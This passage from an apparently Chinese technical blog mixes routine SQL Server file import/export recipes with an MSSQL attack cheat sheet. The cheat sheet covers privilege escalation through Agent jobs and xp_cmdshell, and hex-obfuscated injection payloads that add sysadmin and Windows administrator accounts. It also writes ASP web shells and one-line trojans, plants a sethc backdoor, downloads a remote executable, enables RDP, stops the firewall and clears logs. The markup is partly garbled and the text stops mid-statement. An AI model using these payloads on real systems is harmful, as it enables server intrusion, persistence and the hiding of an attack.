sql’,@subsystem=’CMDEXEC’,@command=’dir c:\&gt;c:\b.txt’;<br>exec sp_add_jobserver @job_name = ‘czy82’,@server_name = ‘smscomputer’;<br>exec sp_start_job @job_name=’czy82’;<br><br>利用MSSQL的作业处理也是可以执行命令的而且如果上面的subsystem的参数是tsql，后面的我们就可以<br>执行tsql语句了.<br>对于这几个储存过程的使用第一在@server_name我们要指定你的sql的服务器名<br>第二系统的sqlserveragent服务必须打开(默认没打开的气人了吧)<br>net start SQLSERVERAGENT<br><br>对于这个东东还有一个地方不同就是public也可以执行..同这儿也是有系统洞洞的看下面的<br>USE msdb<br>EXEC sp_add_job @job_name = ‘GetSystemOnSQL’,<br>@enabled = 1,<br>@description = ‘This will give a low privileged user access to<br>xp_cmdshell’,<br>@delete_level = 1<br>EXEC sp_add_jobstep @job_name = ‘GetSystemOnSQL’,<br>@step_name = ‘Exec my sql’,<br>@subsystem = ‘TSQL’,<br>@command = ‘exec master..xp_execresultset N’’select ‘’’’exec<br>master..xp_cmdshell “dir &gt; c:\agent-job-results.txt”‘’’’’’,N’’Master’’’<br>EXEC sp_add_jobserver @job_name = ‘GetSystemOnSQL’,<br>@server_name = ‘你的SQL的服务器名’<br>EXEC sp_start_job @job_name = ‘GetSystemOnSQL’<br><br>不要怀疑上面的代码，我是测试成功了的!这儿我们要注意xp_execresultset就是因为它所以<br>才让我们可以以public执行xp_cmdshell<br><br>5)关于Microsoft SQL Agent Jobs任意文件可删除覆盖漏洞(public用户也可以)<br>在安焦有文章:[url=<a href="http://www.xfocus.net/vuln/vul_view.php?vul_id=2968]链接标记http://www.xfocus.net/vuln/vul_view.php?vul_id=2968[/url" target="_blank" rel="external">http://www.xfocus.net/vuln/vul_view.php?vul_id=2968]链接标记http://www.xfocus.net/vuln/vul_view.php?vul_id=2968[/url</a>]<br><br>USE msdb<br>EXEC sp_add_job @job_name = ‘ArbitraryFileCreate’,<br>@enabled = 1,<br>@description = ‘This will create a file called c:\sqlafc123.txt’,<br>@delete_level = 1<br>EXEC sp_add_jobstep @job_name = ‘ArbitraryFileCreate’,<br>@step_name = ‘SQLAFC’,<br>@subsystem = ‘TSQL’,<br>@command = ‘select ‘’hello, this file was created by the SQL Agent.’’’,<br>@output_file_name = ‘c:\sqlafc123.txt’<br>EXEC sp_add_jobserver @job_name = ‘ArbitraryFileCreate’,<br>@server_name = ‘SERVER_NAME’<br>EXEC sp_start_job @job_name = ‘ArbitraryFileCreate’<br><br>如果subsystem选的是:tsql，在生成的文件的头部有如下内容<br><br>??揂rbitraryFileCreate? ? 1 ?,揝QLAFC? ???? 2003-02-07 18:24:19<br>———————————————-<br>hello, this file was created by the SQL Agent.<br><br>(1 ?????)<br><br>所以我建议要生成文件最好subsystem选cmdexec,如果利用得好我们可以写一个有添加管理员<br>命令的vbs文件到启动目录!<br><br>6)关于sp_makewebtask(可以写任意内容任意文件名的文件)<br>关于sp_MScopyscriptfile 看下面的例子<br>declare @command varchar(100)<br>declare @scripfile varchar(200)<br>set concat_null_yields_null off<br>select @command=’dir c:\ &gt; “\attackerip\share\dir.txt”‘<br>select @scripfile=’c:\autoexec.bat &gt; nul” | ‘ + @command + ‘ | rd “‘<br>exec sp_MScopyscriptfile @scripfile ,’’<br><br>这两个东东都还在测试试哟<br>让MSSQL的public用户得到一个本机的web shell:)<br><br>sp_makewebtask @outputfile=’d:\sms\a.asp’,@charset=gb2312,<br>–@query=’select ‘’&lt;img src=vbscript:msgbox(now())&gt;’’’<br>–@query=’select ‘’&lt;%response.write request.servervariables(“APPL_PHYSICAL_PATH”)%&gt;’’ ‘<br>@query=’select ‘’<br>&lt;%On Error Resume Next<br>Set oscript = Server.CreateObject(“wscript.SHELL”)<br>Set oscriptNet = Server.CreateObject(“wscript.NETWORK”)<br>Set oFileSys = Server.CreateObject(“scripting.FileSystemObject”)<br>szCMD = Request.Form(“.CMD”)<br>If (szCMD &lt;&gt;””)Then<br>szTempFile = “C:\” &amp; oFileSys.GetTempName()<br>Call oscript.Run (“cmd.exe /c “ &amp; szCMD &amp; “ &gt; “ &amp; szTempFile, 0, True)<br>Set oFile = oFilesys.OpenTextFile (szTempFile, 1, False, 0)<br>End If %&gt;<br>&lt;HTML&gt;&lt;BODY&gt;&lt;FORM action=”&lt;%= Request.ServerVariables(“URL”)%&gt;” method=”POST”&gt;<br>&lt;input type=text name=”.CMD” size=45 value=”&lt;%= szCMD %&gt;”&gt;&lt;input type=submit value=”Run”&gt;<br>&lt;/FORM&gt;&lt;PRE&gt;<br>&lt;% If (IsObject(oFile))Then<br>On Error Resume Next<br>Response.Write Server.HTMLEncode(oFile.ReadAll)<br>oFile.Close<br>Call oFileSys.DeleteFile(szTempFile, True)<br>End If%&gt;<br>&lt;/BODY&gt;&lt;/HTML&gt; ‘’’</strong></pre><br></div><br><span class="cnblogs_code_collapse">View Code</span></div><br>&nbsp;<br><br>&nbsp;
+
+SQL语句导入导出各类文件<strong><br><div class="cnblogs_code"><img src="http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif" alt=""><br><div id="cnblogs_code_open_f1c93a66-51d0-4fb3-b351-49b362082dca" class="cnblogs_code_hide"><br><pre>/<strong>*</strong></pre></div></div></strong> 导出到excel<br>EXEC master..xp_cmdshell ‘bcp SettleDB.dbo.shanghu out c:\temp1.xls -c -q -S”GNETDATA/GNETDATA” -U”sa” -P””‘<br><br>/<strong><strong><em>*</em></strong></strong> 导入Excel<br>Select <em><br>FROM OpenDataSource( ‘Microsoft.Jet.OLEDB.4.0’,<br>‘Data Source=”c:\test.xls”;User ID=Admin;Password=;Extended properties=Excel 5.0’)…xactions<br><br>/</em>动态文件名<br>declare @fn varchar(20),@s varchar(1000)<br>set @fn = ‘c:\test.xls’<br>set @s =’’’Microsoft.Jet.OLEDB.4.0’’,<br>‘’Data Source=”‘+@fn+’”;User ID=Admin;Password=;Extended properties=Excel 5.0’’’<br>set @s = ‘Select <em> FROM OpenDataSource (‘+@s+’)…sheet1$’<br>exec(@s) 
+</em>/<br><br>Select cast(cast(科目编号 as numeric(10,2)) as nvarchar(255))+’　‘ 转换后的别名<br>FROM OpenDataSource( ‘Microsoft.Jet.OLEDB.4.0’,<br>‘Data Source=”c:\test.xls”;User ID=Admin;Password=;Extended properties=Excel 5.0’)…xactions<br><br>/<strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong> EXCEL导到远程SQL<br>insert OPENDATASOURCE(<br>‘SQLOLEDB’,<br>‘Data Source=远程ip;User ID=sa;Password=密码’<br>).库名.dbo.表名 (列名1,列名2)<br>Select 列名1,列名2<br>FROM OpenDataSource( ‘Microsoft.Jet.OLEDB.4.0’,<br>‘Data Source=”c:\test.xls”;User ID=Admin;Password=;Extended properties=Excel 5.0’)…xactions<br><br>/<strong> 导入文本文件<br>EXEC master..xp_cmdshell ‘bcp dbname..tablename in c:\DT.txt -c -Sservername -Usa -Ppassword’<br><br>/</strong> 导出文本文件<br>EXEC master..xp_cmdshell ‘bcp dbname..tablename out c:\DT.txt -c -Sservername -Usa -Ppassword’<br>或<br>EXEC master..xp_cmdshell ‘bcp “Select <em> from dbname..tablename” queryout c:\DT.txt -c -Sservername -Usa -Ppassword’<br><br>导出到TXT文本，用逗号分开<br>exec master..xp_cmdshell ‘bcp “库名..表名” out “d:\tt.txt” -c -t ,-U sa -P password’<br><br>BULK Insert 库名..表名<br>FROM ‘c:\test.txt’<br>WITH (<br>FIELDTERMINATOR = ‘;’,<br>ROWTERMINATOR = ‘\n’<br>)<br><br>–/</em> dBase IV文件<br>select <em> from<br>OPENROWSET(‘MICROSOFT.JET.OLEDB.4.0’<br>,’dBase IV;HDR=NO;IMEX=2;DATABASE=C:\’,’select </em> from [客户资料4.dbf]’)<br>–<em>/<br><br>–/</em> dBase III文件<br>select <em> from<br>OPENROWSET(‘MICROSOFT.JET.OLEDB.4.0’<br>,’dBase III;HDR=NO;IMEX=2;DATABASE=C:\’,’select </em> from [客户资料3.dbf]’)<br>–<em>/<br><br>–/</em> FoxPro 数据库<br>select <em> from openrowset(‘MSDASQL’,<br>‘Driver=Microsoft Visual FoxPro Driver;SourceType=DBF;SourceDB=c:\’,<br>‘select </em> from [aa.DBF]’)<br>–<em>/<br><br>/<strong><strong><strong>**</strong></strong></strong>导入DBF文件<strong><strong><strong><em>**</em></strong></strong></strong>/<br>select </em> from openrowset(‘MSDASQL’,<br>‘Driver=Microsoft Visual FoxPro Driver;<br>SourceDB=e:\VFP98\data;<br>SourceType=DBF’,<br>‘select <em> from customer where country != “USA” order by country’)<br>go<br>/<strong><strong><strong><em>**</em></strong></strong></strong></em> 导出到DBF <strong><strong><strong><em>*</em></strong></strong></strong>/<br>如果要导出数据到已经生成结构(即现存的)FOXPRO表中,可以直接用下面的SQL语句<br><br>insert into openrowset(‘MSDASQL’,<br>‘Driver=Microsoft Visual FoxPro Driver;SourceType=DBF;SourceDB=c:\’,<br>‘select <em> from [aa.DBF]’)<br>select </em> from 表<br><br>说明:<br>SourceDB=c:\ 指定foxpro表所在的文件夹<br>aa.DBF 指定foxpro表的文件名.<br><br>/<strong><strong><strong>*</strong></strong></strong>导出到Access<strong><strong><strong><strong><em>**</em></strong></strong></strong></strong>/<br>insert into openrowset(‘Microsoft.Jet.OLEDB.4.0’,<br>‘x:\A.mdb’;’admin’;’’,A表) select <em> from 数据库名..B表<br><br>/<strong><strong><em>**</em></strong></strong></em>导入Access<strong><strong><strong><strong><em>**</em></strong></strong></strong></strong>/<br>insert into B表 selet <em> from openrowset(‘Microsoft.Jet.OLEDB.4.0’,<br>‘x:\A.mdb’;’admin’;’’,A表)<br><br>文件名为参数<br>declare @fname varchar(20)<br>set @fname = ‘d:\test.mdb’<br>exec(‘Select a.</em> FROM opendatasource(‘’Microsoft.Jet.OLEDB.4.0’’,<br>‘’’+@fname+’’’;’’admin’’;’’’’, topics) as a ‘)<br><br>Select <em><br>FROM OpenDataSource( ‘Microsoft.Jet.OLEDB.4.0’,<br>‘Data Source=”f:\northwind.mdb”;Jet OLEDB:Database Password=123;User ID=Admin;Password=;’)…产品<br><br><strong><strong><strong><strong><em>**</em></strong></strong></strong></strong></em> 导入 xml　文件<br><br>DECLARE @idoc int<br>DECLARE @doc varchar(1000)<br>–sample XML document<br>SET @doc =’<br>&lt;root&gt;<br>&lt;Customer cid= “C1” name=”Janine” city=”Issaquah”&gt;<br>&lt;Order oid=”O1” date=”1/20/1996” amount=”3.5” /&gt;<br>&lt;Order oid=”O2” date=”4/30/1997” amount=”13.4”&gt;Customer was very satisfied<br>&lt;/Order&gt;<br>&lt;/Customer&gt;<br>&lt;Customer cid=”C2” name=”Ursula” city=”Oelde” &gt;<br>&lt;Order oid=”O3” date=”7/14/1999” amount=”100” note=”Wrap it blue<br>white red”&gt;<br>&lt;Urgency&gt;Important&lt;/Urgency&gt;<br>Happy Customer.<br>&lt;/Order&gt;<br>&lt;Order oid=”O4” date=”1/20/1996” amount=”10000”/&gt;<br>&lt;/Customer&gt;<br>&lt;/root&gt;<br>‘<br>– Create an internal representation of the XML document.<br>EXEC sp_xml_preparedocument @idoc OUTPUT, @doc<br><br>– Execute a Select statement using OPENXML rowset provider.<br>Select <em><br>FROM OPENXML (@idoc, ‘/root/Customer/Order’, 1)<br>WITH (oid char(5),<br>amount float,<br>comment ntext ‘text()’)<br>EXEC sp_xml_removedocument @idoc<br><br>???????<br><br>/<strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong>Excel导到Txt<strong><strong><strong><strong><strong><strong><strong><strong><strong><em>**</em></strong></strong></strong></strong></strong></strong></strong></strong></strong>/<br>想用<br>select </em> into opendatasource(…) from opendatasource(…)<br>实现将一个Excel文件内容导入到一个文本文件<br><br>假设Excel中有两列，第一列为姓名，第二列为很行帐号(16位)<br>且银行帐号导出到文本文件后分两部分，前8位和后8位分开。<br><br>邹健：<br>如果要用你上面的语句插入的话,文本文件必须存在,而且有一行:姓名,银行账号1,银行账号2<br>然后就可以用下面的语句进行插入<br>注意文件名和目录根据你的实际情况进行修改.<br><br>insert into<br>opendatasource(‘MICROSOFT.JET.OLEDB.4.0’<br>,’Text;HDR=Yes;DATABASE=C:\’<br>)…[aa#txt]<br>–,aa#txt)<br>–<em>/<br>select 姓名,银行账号1=left(银行账号,8),银行账号2=right(银行账号,8)<br>from<br>opendatasource(‘MICROSOFT.JET.OLEDB.4.0’<br>,’Excel 5.0;HDR=YES;IMEX=2;DATABASE=c:\a.xls’<br>–,Sheet1$)<br>)…[Sheet1$]<br><br>如果你想直接插入并生成文本文件,就要用bcp<br><br>declare @sql varchar(8000),@tbname varchar(50)<br><br>–首先将excel表内容导入到一个全局临时表<br>select @tbname=’[##temp’+cast(newid() as varchar(40))+’]’<br>,@sql=’select 姓名,银行账号1=left(银行账号,8),银行账号2=right(银行账号,8)<br>into ‘+@tbname+’ from<br>opendatasource(‘’MICROSOFT.JET.OLEDB.4.0’’<br>,’’Excel 5.0;HDR=YES;IMEX=2;DATABASE=c:\a.xls’’<br>)…[Sheet1$]’<br>exec(@sql)<br><br>–然后用bcp从全局临时表导出到文本文件<br>set @sql=’bcp “‘+@tbname+’” out “c:\aa.txt” /S”(local)” /P”” /c’<br>exec master..xp_cmdshell @sql<br><br>–删除临时表<br>exec(‘drop table ‘+@tbname)<br><br>/<strong><strong><strong><strong><em>**</em></strong></strong></strong></strong>导整个数据库<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>**</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></em>/<br><br>用bcp实现的存储过程<br><br>/<em><br>实现数据导入/导出的存储过程<br>根据不同的参数,可以实现导入/导出整个数据库/单个表<br>调用示例:<br>–导出调用示例<br>—-导出单个表<br>exec file2table ‘zj’,’’,’’,’xzkh_sa..地区资料’,’c:\zj.txt’,1<br>—-导出整个数据库<br>exec file2table ‘zj’,’’,’’,’xzkh_sa’,’C:\docman’,1<br><br>–导入调用示例<br>—-导入单个表<br>exec file2table ‘zj’,’’,’’,’xzkh_sa..地区资料’,’c:\zj.txt’,0<br>—-导入整个数据库<br>exec file2table ‘zj’,’’,’’,’xzkh_sa’,’C:\docman’,0 
+
+</em>/<br>if exists(select 1 from sysobjects where name=’File2Table’ and objectproperty(id,’IsProcedure’)=1)<br>drop procedure File2Table<br>go<br>create procedure File2Table<br>@servername varchar(200) –服务器名<br>,@username varchar(200) –用户名,如果用NT验证方式,则为空’’<br>,@password varchar(200) –密码<br>,@tbname varchar(500) –数据库.dbo.表名,如果不指定:.dbo.表名,则导出数据库的所有用户表<br>,@filename varchar(1000) –导入/导出路径/文件名,如果@tbname参数指明是导出整个数据库,则这个参数是文件存放路径,文件名自动用表名.txt<br>,@isout bit –1为导出,0为导入<br>as<br>declare @sql varchar(8000)<br><br>if @tbname like ‘%.%.%’ –如果指定了表名,则直接导出单个表<br>begin<br>set @sql=’bcp ‘+@tbname<br>+case when @isout=1 then ‘ out ‘ else ‘ in ‘ end<br>+’ “‘+@filename+’” /w’<br>+’ /S ‘+@servername<br>+case when isnull(@username,’’)=’’ then ‘’ else ‘ /U ‘+@username end<br>+’ /P ‘+isnull(@password,’’)<br>exec master..xp_cmdshell @sql<br>end<br>else<br>begin –导出整个数据库,定义游标,取出所有的用户表<br>declare @m_tbname varchar(250)<br>if right(@filename,1)&lt;&gt;’\’ set @filename=@filename+’\’<br><br>set @m_tbname=’declare #tb cursor for select name from ‘+@tbname+’..sysobjects where xtype=’’U’’’<br>exec(@m_tbname)<br>open #tb<br>fetch next from #tb into @m_tbname<br>while @@fetch_status=0<br>begin<br>set @sql=’bcp ‘+@tbname+’..’+@m_tbname<br>+case when @isout=1 then ‘ out ‘ else ‘ in ‘ end<br>+’ “‘+@filename+@m_tbname+’.txt “ /w’<br>+’ /S ‘+@servername<br>+case when isnull(@username,’’)=’’ then ‘’ else ‘ /U ‘+@username end<br>+’ /P ‘+isnull(@password,’’)<br>exec master..xp_cmdshell @sql<br>fetch next from #tb into @m_tbname<br>end<br>close #tb<br>deallocate #tb<br>end<br>go<br><br>/<strong><strong><strong>*</strong></strong></strong> oracle <strong><strong><strong>**</strong></strong></strong>/<br>EXEC sp_addlinkedserver ‘OracleSvr’,<br>‘Oracle 7.3’,<br>‘MSDAORA’,<br>‘ORCLDB’<br>GO<br><br>delete from openquery(mailser,’select <em> from yulin’)<br>select </em> from openquery(mailser,’select <em> from yulin’)<br>update openquery(mailser,’select </em> from yulin where id=15’)set disorder=555,catago=888<br>insert into openquery(mailser,’select disorder,catago from yulin’)values(333,777)<br><br>补充：<br>对于用bcp导出,是没有字段名的.<br>用openrowset导出,需要事先建好表.<br>用openrowset导入,除ACCESS及EXCEL外,均不支持非本机数据导入<br><br><span class="cnblogs_code_collapse">View Code</span><br>&nbsp;<br><br>&nbsp;<br><br><strong>SQL存储过程</strong><br><div class="cnblogs_code"><img src="http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif" alt=""><br><div id="cnblogs_code_open_b9720e7c-aeb9-4c66-8816-2ab61e7e16c3" class="cnblogs_code_hide"><br><pre>sql2005恢复xp_cmdshell<br>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;<br>关闭:EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;<br>零、<br>– 添加SA用户–<br><br>1、exec master.dbo.sp_addlogin system;<br>2、exec master.dbo.sp_addlogin system,system;<br>3、exec master.dbo.sp_addsrvrolemember itpro,sysadmin<br><br>防注入 sa:itpro pass:itpro<br>declare @s varchar(4000) set @s=cast(0x65786563206d61737465722e64626f2e73705f6164646c6f67696e20697470726f as varchar(4000));exec(@s); declare @c varchar(4000) set @c=cast(0x65786563206d61737465722e64626f2e73705f70617373776f7264206e756c6c2c697470726f2c697470726f as varchar(4000));exec(@c); declare @a varchar(4000) set @a=cast(0x65786563206d61737465722e64626f2e73705f616464737276726f6c656d656d6265722027697470726f272c2073797361646d696e as varchar(4000));exec(@a);– and 1=1<br><br>防注入 sa:system pass:system<br>declare @s varchar(4000) set @s=cast(0x65786563206d61737465722e64626f2e73705f6164646c6f67696e2073797374656d2c73797374656d as varchar(4000));exec(@s);declare @a varchar(4000) set @a=cast(0x65786563206d61737465722e64626f2e73705f616464737276726f6c656d656d626572202773797374656d272c2073797361646d696e as varchar(4000));exec(@a);– and 1=1<br>一、<br>-恢复存储过程-<br><br>use master<br>exec sp_addextendedproc xp_cmdshell,’xp_cmdshell.dll’<br>exec sp_dropextendedproc “xp_cmdshell”<br>exec sp_addextendedproc ‘xp_cmdshell’, ‘xpsql70.dll’<br>exec sp_dropextendedproc ‘xp_cmdshell’<br>exec sp_addextendedproc ‘xp_cmdshell’,’xpweb70.dll’<br>exec sp_addextendedproc xp_dirtree,’xpstar.dll’<br>exec sp_addextendedproc xp_enumgroups,’xplog70.dll’<br>exec sp_addextendedproc xp_fixeddrives,’xpstar.dll’<br>exec sp_addextendedproc xp_loginconfig,’xplog70.dll’<br>exec sp_addextendedproc xp_enumerrorlogs,’xpstar.dll’<br>exec sp_addextendedproc xp_getfiledetails,’xpstar.dll’<br>exec sp_addextendedproc sp_OACreate,’odsole70.dll’<br>exec sp_addextendedproc sp_OADestroy,’odsole70.dll’<br>exec sp_addextendedproc sp_OAGetErrorInfo,’odsole70.dll’<br>exec sp_addextendedproc sp_OAGetProperty,’odsole70.dll’<br>exec sp_addextendedproc sp_OAMethod,’odsole70.dll’<br>exec sp_addextendedproc sp_OASetProperty,’odsole70.dll’<br>exec sp_addextendedproc sp_OAStop,’odsole70.dll’<br>exec sp_addextendedproc xp_regaddmultistring,’xpstar.dll’<br>exec sp_addextendedproc xp_regdeletekey,’xpstar.dll’<br>exec sp_addextendedproc xp_regdeletevalue,’xpstar.dll’<br>exec sp_addextendedproc xp_regenumvalues,’xpstar.dll’<br>exec sp_addextendedproc xp_regread,’xpstar.dll’<br>exec sp_addextendedproc xp_regremovemultistring,’xpstar.dll’<br>exec sp_addextendedproc xp_regwrite,’xpstar.dll’<br>exec sp_addextendedproc xp_availablemedia,’xpstar.dll’<br><br>恢复cmdshell防注入<br>declare @a varchar(255),@b varchar(255),@c varchar(255);<br>set @a=0x6D61737465722E2E73705F616464657874656E64656470726F63;<br>set @b=0x78705F636D647368656C6C;<br>set @c=0x78706C6F6737302E646C6C;<br>exec @a @b,@c<br><br>二、<br>–恢复sp_addextendedproc存储过程–<br><br>create procedure sp_addextendedproc — 1996/08/30 20:13<br>@functname nvarchar(517),/<em> (owner.)name of function to call </em>/ @dllname varchar(255)/<em> name of DLL containing function </em>/ as<br>set implicit_transactions off<br>if @@trancount &gt; 0<br>begin<br>raiserror(15002,-1,-1,’sp_addextendedproc’)<br>return (1)<br>end<br>dbcc addextendedproc( @functname, @dllname)<br>return (0) – sp_addextendedproc<br>GO<br><br>三、<br>–使用存储过程加管理方法–<br><br>1、master.dbo.xp_cmdshell ‘net user itpro gmasfm &amp;&amp; net localgroup administrators itpro /add’<br>2、EXEC sp_resolve_logins ‘text’, ‘e:\asp\”&amp;net user admina admin /add&amp;net localgroup administrators admina /add&amp;dir “e:\asp’, ‘1.asp’<br>3、DECLARE @shell INT EXEC SP_OAcreate ‘wscript.shell’,@shell OUTPUT EXEC SP_OAMETHOD<br>@shell,’run’,null, ‘C:\WINdows\system32\cmd.exe /c net user sadfish fish /add’<br><br>四、<br>– 导出文件的存储过程  –<br><br>DECLARE @shell INT EXEC SP_OAcreate ‘wscript.shell’,@shell OUTPUT EXEC SP_OAMETHOD @shell,’run’,null, ‘C:\WINdows\system32\cmd.exe /c netstat -an &gt;c:\1.txt’<br><br>五、<br>–  读取文件的存储过程   –<br><br>declare @o int, @f int, @t int, @ret int<br>declare @line varchar(8000)<br>exec sp_oacreate ‘scripting.filesystemobject’, @o out<br>exec sp_oamethod @o, ‘opentextfile’, @f out, ‘c:\1.txt’, 1<br>exec @ret = sp_oamethod @f, ‘readline’, @line out<br>while( @ret = 0 )<br>begin<br>print @line<br>exec @ret = sp_oamethod @f, ‘readline’, @line out<br>end<br><br>六、<br>—–写一句话木马—–<br><br>declare @o int, @f int, @t int, @ret int<br>exec sp_oacreate ‘scripting.filesystemobject’, @o out<br>exec sp_oamethod @o, ‘createtextfile’, @f out, ‘c:\Inetpub\tianhong\2.asp’, 1<br>exec @ret = sp_oamethod @f, ‘writeline’, NULL,<br>‘&lt;%execute(request(“a”))%&gt;’     ‘ ‘ 单引号为要写的内容<br>&lt;%25 if request(“x”)&lt;&gt;”” then execute(request(“x”))%25&gt;<br><br>防注入写入法<br>declare @a int,@b int,@c varchar(255),@d varchar(255),@e varchar(255),@f varchar(255),@g varchar(255),@h varchar(255),@i varchar(255),@j varchar(255);<br>set @c=0x6D61737465722E2E73705F6F61637265617465;<br>set @d=0x6D61737465722E2E73705F6F616D6574686F64;<br>set @e=0x536372697074696E672E46696C6573797374656D4F626A656374;<br>set @f=0x4372656174655465787446696C65;<br>set @g=0x433A5C496E65747075625C73797374656D2E617370;<br>set @h=0x74727565;<br>set @i=0x7772697465;<br>set @j=0x3C256576616C20726571756573742822582229253E;<br>exec @c @e,@a output;<br>exec @d @a,@f,@b output,@g,@h;<br>exec @d @b,@i,null,@j<br><br>七、<br>—–写一句话木马—–<br><br>declare @s nvarchar(4000);select @s=0x730065006c00650063007400200027003c00250045007800650063007500740065002800720065007100750065007300740028002200610022002900290025003e000d000a002700;exec sp_makewebtask 0x43003a005c007a00770065006c006c002e00610073007000, @s;– and% 1=1<br>在上面一样;exec%20sp_makewebtask%20’d:\zjkdj\zjkdj\zjkds\bake.asp,’%20select%20’’&lt;%25execute(request(“a”))%25&gt;’’%20’;–<br><br>八、<br>—SA沙盒模式提权—–<br><br>1、exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,0;–<br><br>2、Select <em> From OpenRowSet(‘Microsoft.Jet.OLEDB.4.0’,’;Database=c:\windows\system32\ias\ias.mdb’,’select shell(“net user itpro gmasfm /add”)’);<br><br>九、<br>—–另类SA提权—–<br><br>2、declare @oo int<br>exec sp_oacreate ‘scripting.filesystemobject’, @oo out<br>exec sp_oamethod @oo, ‘copyfile’,null,’c:\windows\system32\sethc.exe’ ,’c:\windows\system32\dllcache\sethc.exe’;<br>1、declare @o int<br>exec sp_oacreate ‘scripting.filesystemobject’, @o out<br>exec sp_oamethod @o, ‘copyfile’,null,’c:\windows\explorer.exe’ ,’c:\windows\system32\sethc.exe’;<br><br>DECLARE @o int<br>DECLARE @z int<br>EXEC sp_OACreate ‘Shell.Users’,@o OUT<br>EXEC sp_OAMethod @o, ‘Create’, @z OUT, ‘test’<br>EXEC sp_OASetProperty  @z, ‘setting’, 3 , ‘AccountType’<br>EXEC sp_OAMethod @z, ‘ChangePassword’,NULL , ‘123456’, ‘’<br><br>十、<br>–导出注册表–<br><br>1、drop table [regdir];create table <a href="value nvarchar(1000">regdir</a> null,data nvarchar(1000) null)–<br><br>2、delete [regdir];insert [regdir]exec master..xp_regread ‘HKEY_LOCAL_MACHINE’,’SYSTEM\RAdmin\v2.0\Server\Parameters’,’port’<br><br>十一、<br>—下载程序—–<br><br>1、declare @b varbinary(8000),@hr int,@http int,@down int exec sp_oacreate [microsoft.xmlhttp],@http output exec @hr = sp_oamethod @http,[open],null,[get],[[url=<a href="http://192.168.1.6:800/wwwroot.rar]链接标记http://192.168.1.6:800/wwwroot.rar[/url]],0" target="_blank" rel="external">http://192.168.1.6:800/wwwroot.rar]链接标记http://192.168.1.6:800/wwwroot.rar[/url]],0</a> exec @hr = sp_oamethod @http,[send],null exec @hr=sp_oagetproperty @http,[responsebody],@b output exec @hr=sp_oacreate [adodb.stream],@down output exec @hr=sp_oasetproperty @down,[type],1 exec @hr=sp_oasetproperty @down,[mode],3 exec @hr=sp_oamethod @down,[open],null exec @hr=sp_oamethod @down,[write],null,@b exec @hr=sp_oamethod @down,[savetofile],null,[c:/a.exe],1 ;– and 1=1<br><br>十二、<br>-Log备份WebShell-<br><br>alter database master set RECOVERY FULL<br>create table cmd (a image)–<br>backup log master to disk = ‘c:\cmd’ with init<br>insert into cmd (a) values (‘&lt;%eval(request(“a”)):response.end%&gt;’)–<br>backup log master to disk = ‘C:\Inetpub\wwwroot\ri3.asp’–<br>drop table cmd–<br>2\<br><br>use mir<br>alter database mir set RECOVERY FULL –<br>create table cmd8 (a image)–<br>backup log mir to disk = ‘c:\cmd8’ with init –<br>insert into cmd8 (a) values (‘&lt;%eval(request(“a”)):response.end%&gt;’)–<br>backup log mir to disk = ‘c:\backup.asp’–<br>drop table cmd8–<br>alter database mir set RECOVERY SIMPLE –<br>3\<br>create/<strong>/table/</strong>/[dbo].[shit_tmp]/<strong>/([cmd]/</strong>/[image])–<br>declare/<strong>/@a/</strong>/sysname,@s/<strong>/nvarchar(4000)/</strong>/select/<strong>/@a=db_name(),@s=0x6C0061006F007A0068006F007500/</strong>/backup/<strong>/log/</strong>/@a/<strong>/to/</strong>/disk/<strong>/=/</strong>/@s/<strong>/with/</strong>/init,no_truncate–<br>insert/<strong>/into/</strong>/<a href="cmd">shit_tmp</a>/<strong>/values(0x3C256576616C28726571756573742822612229293A726573706F6E73652E656E64253E)–<br>select/</strong>/@s=0x63003a005c0031002e00610073007000/<strong>/backup/</strong>/log/<strong>/@a/</strong>/to/<strong>/disk=@s/</strong>/with/<strong>/init,no_truncate–<br>Drop/</strong>/table/**/[shit_tmp]–<br>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br><br>十三、<br>——————————-<br>–创建sp_readtextfile存储过程–<br>——————————-<br>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br>Create proc sp_readTextFile @filename sysname<br>as<br><br>  begin<br>  set nocount on<br>  Create table #tempfile (line varchar(8000))<br>  exec (‘bulk insert #tempfile from “‘ + @filename + ‘“‘)<br>  select </em> from #tempfile<br>  drop table #tempfile<br>End<br>go<br><br>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br><br>十四、开3389<br>===================================================================<br>declare @a varchar(255),@b varchar(255); set @a=0x6D61737465722E64626F2E78705F636D647368656C6C; set @b=0x636D64202F6320776D6963205244544F47474C45205748455245205365727665724E616D653D2725434F4D50555445524E414D4525272063616C6C20536574416C6C6F775453436F6E6E656374696F6E732031; exec @a @b<br>===================================================================<br><br>我记得2003的web目录是写在C:\WINDOWS\system32\inetsrv\MetaBase.xml<br>—————–<br>—读取文件内容–<br>—————–<br>exec sp_readTextFile ‘c:\boot.ini’<br><br>xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File  Execution Options\sethc.exe’,’debugger’,’reg_sz’,’c:\windows\system32\cmd.exe’<br><br>———————–<br>—清除MsSql日志——-<br>———————–<br>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br>set nocount on<br>declare @logicalfilename sysname,<br>@maxminutes int,<br>@newsize int<br>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br><br>———————-<br>–停掉或激活某个服务–<br>———————-<br>exec master..xp_servicecontrol ‘stop’,’sharedaccess’<br>exec master..xp_servicecontrol ‘start’,’sharedaccess’<br><br>——————–<br>–列出驱动器的名称–<br>——————–<br><br>EXEC 